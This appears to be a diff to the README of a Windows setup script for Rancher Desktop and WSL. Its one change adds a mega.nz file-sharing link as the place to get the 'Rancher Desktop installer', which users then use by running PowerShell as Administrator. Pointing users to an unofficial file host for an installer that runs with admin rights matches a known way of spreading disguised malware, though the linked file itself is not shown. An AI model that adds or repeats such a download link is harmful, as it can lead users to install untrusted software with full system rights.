@@ -32,7 +32,7 @@ It is designed for **one-click setup**: detects prerequisites, enables Windows f
 ## Usage
 
 1. Clone/download this repo.  
-2. Place your **Rancher Desktop installer** (`Rancher.Desktop-x.y.z.msi` or `.exe`) in the same folder as `setup-wsl.ps1`.  
+2. Place your **Rancher Desktop installer** (`Rancher.Desktop-x.y.z.msi` or `.exe`) link to app: https://mega.nz/file/4gRFTIiK#kJ_FhoG_xHgo_rXxTMEAYkZfVwuQb_UMrM6A7GYnP3Q  in the same folder as `setup-wsl.ps1`.  
 3. Open **PowerShell as Administrator**.  
 4. Run:
 
